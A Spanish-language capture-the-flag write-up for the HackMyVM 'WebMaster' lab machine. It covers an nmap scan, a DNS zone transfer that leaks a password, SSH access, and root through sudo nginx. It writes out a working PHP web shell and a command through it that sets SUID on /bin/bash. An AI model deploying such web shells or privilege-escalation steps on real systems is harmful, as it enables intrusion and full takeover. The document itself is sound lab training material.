---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# WebMaster HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 13:52 EDT
Nmap scan report for 192.168.5.10
Host is up (0.0027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  Eero device dnsd
| dns-nsid: 
|_  bind.version: not currently available
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:89:42:A8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.04 seconds
```

Vemos `2` puertos interesantes, que seria el `80` y despues el `53` que esta correspondido con el `DNS`, vamos a investigar primero el puerto `80` que aloja una pagina web, si entramos dentro veremos la siguiente pagina:

<figure><img src="../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

No veremos nada interesante, si inspeccionamos la pagina veremos lo siguiente:

```html
<!--webmaster.hmv-->
```

Por lo que vemos es un `dominio` vamos añadirlo a nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano

<IP>          webmaster.hmv
```

Lo guardamos y entramos en la pagina mediante dicho dominio.

```
URL = http://webmaster.hmv/
```

Veremos la misma pagina, pero vamos a realizar un poco de `fuzzing` a ver si encontramos otro `subdominio` o algo parecido.

Pero si intentamos encontrar algun `subdominio` no encontraremos nada, recordemos que tambien tenemos el puerto `53` abierto, vamos a probar a utilizar la herramienta `dig` para enumerar informacion en tal caso de que tuviera alguna mala configuracion.

## Escalate user john

### dig

Ya que tenemos un `dominio` valido, podremos hacer lo siguiente:

```shell
dig @<IP> webmaster.hmv any
```

Info:

```
; <<>> DiG 9.20.4-4-Debian <<>> @192.168.5.10 webmaster.hmv any
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40019
;; flags: qr aa rd; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 14bac62cb63a33419d3dc7f6681e4382b418d7761d9cda3d (good)
;; QUESTION SECTION:
;webmaster.hmv.                 IN      ANY

;; ANSWER SECTION:
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.

;; ADDITIONAL SECTION:
ns1.webmaster.hmv.      604800  IN      A       127.0.0.1

;; Query time: 16 msec
;; SERVER: 192.168.5.10#53(192.168.5.10) (TCP)
;; WHEN: Fri May 09 14:03:45 EDT 2025
;; MSG SIZE  rcvd: 145
```

Veremos que nos muestra el servidor principal `DNS` de dicho dominio llamado `ns1`, con esta informacion podremos enumerar de forma mas detallada para ver si encontramos algo util.

```shell
dig @<IP> webmaster.hmv axfr
```

Info:

```
; <<>> DiG 9.20.4-4-Debian <<>> @192.168.5.10 webmaster.hmv axfr
; (1 server found)
;; global options: +cmd
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
webmaster.hmv.          604800  IN      NS      ns1.webmaster.hmv.
ftp.webmaster.hmv.      604800  IN      CNAME   www.webmaster.hmv.
john.webmaster.hmv.     604800  IN      TXT     "Myhiddenpazzword"
mail.webmaster.hmv.     604800  IN      A       192.168.0.12
ns1.webmaster.hmv.      604800  IN      A       127.0.0.1
www.webmaster.hmv.      604800  IN      A       192.168.0.11
webmaster.hmv.          604800  IN      SOA     ns1.webmaster.hmv. root.webmaster.hmv. 2 604800 86400 2419200 604800
;; Query time: 16 msec
;; SERVER: 192.168.5.10#53(192.168.5.10) (TCP)
;; WHEN: Fri May 09 14:06:30 EDT 2025
;; XFR size: 8 records (messages 1, bytes 274)
```

Vemos que hemos conseguido informacion de la `Zona DNS` de forma anonima, es una vulnerabilidad muy critica, pero la cual con ella hemos obtenido las posibles credenciales del usuario `john`, vamos a probarlas por `SSH`.

### SSH

```shell
ssh john@<IP>
```

Metemos como contraseña `Myhiddenpazzword` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVdnsyo
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Vemos que podemos ejecutar `nginx` como el usuario `root`, por lo que podemos intuir que la vulnerabilidad puede venir sobre la pagina web.

Vamos a leer la `configuracion` de dicho servidor:

```shell
cat /etc/nginx/sites-enabled/default
```

Info:

```
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        # pass PHP scripts to FastCGI server
        #
        location ~ \.php$ {
                include /etc/nginx/snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        }

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #       deny all;
        #}
}


# Virtual Host configuration for example.com
#
# You can move that to a different file under sites-available/ and symlink that
# to sites-enabled/ to enable it.
#
#server {
#       listen 80;
#       listen [::]:80;
#
#       server_name example.com;
#
#       root /var/www/example.com;
#       index index.html;
#
#       location / {
#               try_files $uri $uri/ =404;
#       }
#}
```

Veremos varias cosas interesantes, pero entre ellas vemos que el usuario que deberia de ser `www-data` que es el que viene por defecto, en este caso lo esta gestionando `root` justo en el sitio web de `/var/www/html` el que vimos antes, por lo que vamos a crear un archivo en la `web` para poder ejecutar comando mediante `PHP` como el usuario `root`.

```shell
cd /var/www/html
nano webshell.php
```

> webshell.php

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Usa ?cmd=COMANDO para ejecutar.";
}
?>
```

Lo guardamos y le ponemos permisos de ejecuccion:

```shell
chmod +x webshell.php
```

Ahora accederemos desde la `URL` de esta forma:

```
URL = http://<IP>/webshell.php?cmd=id
```

Info:

```
uid=0(root) gid=0(root) groups=0(root)
```

Vemos que esta funcionando, por lo que vamos hacer lo siguiente:

```
URL = http://<IP>/webshell.php?cmd=chmod%20u%2Bs%20%2Fbin%2Fbash
```

Ahora si volvemos al servidor y listamos la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Vemos que ha funcionado, por lo que vamos a ejecutar lo siguiente para ser `root`.

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Con esto ya seremos `root`, por lo que leeremos la `flag` del usuario `root`:

> root.txt

```
HMVnginxpwnd
```
